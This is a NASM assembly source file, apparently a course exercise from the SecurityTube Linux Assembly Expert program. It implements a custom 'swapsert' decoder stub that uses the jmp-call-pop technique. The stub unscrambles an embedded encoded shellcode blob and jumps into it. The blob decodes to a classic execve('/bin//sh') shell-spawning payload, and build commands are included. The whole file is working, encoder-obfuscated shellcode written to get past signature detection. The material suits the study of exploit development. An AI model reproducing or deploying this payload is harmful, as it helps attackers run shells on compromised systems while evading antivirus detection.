; Decodes and runs bytes generated vis swapsert-encoder.py
; This was created as part of the SecurityTube Linux Assembly Expert
; course at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
;
; Travis Mathison
;
; The MIT License (MIT)
; 
; Copyright (c) 2018 Travis Mathison
;
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
;
; The above copyright notice and this permission notice shall be included in all
; copies or substantial portions of the Software.
;
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
; SOFTWARE.
;
; BUILD:
; nasm -f elf32 ./swapsert-decoder.nasm -o swapsert-decoder.o
; ld ./swapsert-decoder.o -o swapsert-decoder

global _start			

section .text
_start:
    jmp short call_shellcode

decoder:
    pop esi             ; save location of encoded shellcode
    xor ebx,ebx         ; zero out ebx - used for swapping
    xor ecx,ecx         ; zero out ecx - used for counting
    mul ecx             ; zero out EAX/EDX
    mov edi,esi         ; 
    mov cl,2            ; location of next expected insert byte

decode:
    cmp byte [esi+ecx], 0x7f    ; 
    jne done                    ; 
    mov al, [esi+ecx-2]         ; save first byte in pair
    mov bl, [esi+ecx-1]         ; save second byte in pair
    mov [edi], bl               ; swap byte
    mov [edi+1], al             ; swap byte
    add ecx,3                   ;
    add edi,2
    jmp short decode

done:
    jmp short EncodedShellcode

call_shellcode:
    call decoder
    EncodedShellcode: db 0xc0,0x31,0x7f,0x68,0x50,0x7f,0x2f,0x2f,0x7f,0x68,0x73,0x7f,0x2f,0x68,0x7f,0x69,0x62,0x7f,0x89,0x6e,0x7f,0x50,0xe3,0x7f,0xe2,0x89,0x7f,0x89,0x53,0x7f,0xb0,0xe1,0x7f,0xcd,0x0b,0x7f,0x7f,0x80,0x7f
